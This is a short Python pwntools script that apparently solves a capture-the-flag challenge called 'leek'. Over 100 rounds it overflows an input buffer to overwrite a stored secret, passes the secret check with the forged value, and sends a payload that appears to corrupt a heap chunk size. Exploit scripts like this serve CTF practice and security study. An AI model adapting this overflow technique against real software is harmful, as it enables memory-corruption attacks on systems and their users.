from subprocess import check_output
from tqdm import trange
from pwn import *

if args['REMOTE']:
    r = remote('127.0.0.1', 5000)
else:
    r = process('./leek')
    input("Attach a debugger? ")

fake_secret = b'B' * 0x20

for i in trange(100):
    r.recvuntil(b'Your input (NO STACK BUFFER OVERFLOWS!!): ')
    buf = b'A' * 0x20
    buf += fake_secret
    r.sendline(buf)
    r.recvuntil(b'So? What\'s my secret? ')
    r.send(fake_secret)
    r.recvuntil(b'Say what you want: ')
    r.sendline(b'A' * 0x18 + p64(0x31))

print(r.recvall())
